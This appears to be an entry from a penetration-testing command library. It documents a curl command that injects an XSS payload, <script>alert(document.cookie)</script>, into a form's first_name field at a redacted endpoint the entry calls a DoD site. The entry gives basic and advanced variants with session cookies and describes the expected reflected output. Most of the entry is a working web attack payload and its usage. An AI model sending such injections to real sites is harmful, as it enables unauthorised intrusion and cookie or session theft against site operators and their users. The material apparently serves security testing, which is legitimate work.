---
id: cmd-curl-self-xss
data: >-
  curl -X POST https://██████████/ -d
  "first_name=test\";<script>alert(document.cookie)</script>&middle_name=&last_name="
  -H "Content-Type: application/x-www-form-urlencoded" --cookie
  "session=your_session_cookie"
tags:
  - web
  - xss
  - curl
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:41.673Z'
verified: false
validated: true
submitted: true
---
# curl-submit-self-xss-form

## Command

```bash
curl -X POST https://██████████/ -d "first_name=test\";<script>alert(document.cookie)</script>&middle_name=&last_name=" -H "Content-Type: application/x-www-form-urlencoded" --cookie "session=your_session_cookie"
```

## Description

This command uses curl to submit a malicious form payload to the DoD site's endpoint, injecting an XSS payload into the first_name field to test for self-XSS reflection. Use it to simulate form submission without a browser.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `-d` | Form data string with payload | Yes |
| `-H` | Sets content type header | Yes |
| `--cookie` | Includes session cookie if needed | No |

## Examples

### Basic Usage

```bash
curl -X POST https://██████████/ -d "first_name=test\";<script>alert(document.cookie)</script>&middle_name=&last_name=" -H "Content-Type: application/x-www-form-urlencoded"
```

### Advanced Usage

```bash
curl -X POST https://██████████/ -d "first_name=test\";<script>alert(document.cookie)</script>&middle_name=Test&last_name=Victim" -H "Content-Type: application/x-www-form-urlencoded" --cookie "JSESSIONID=abc123" -v
```

## Expected Output

HTTP response body containing the reflected form data with the unsanitized script tag, e.g., HTML snippet showing <script>alert(document.cookie)</script> in the page source. No alert in curl; view in browser for execution.

## Related

- [[Related Procedure: Demonstrate-Self-XSS-Injection]]
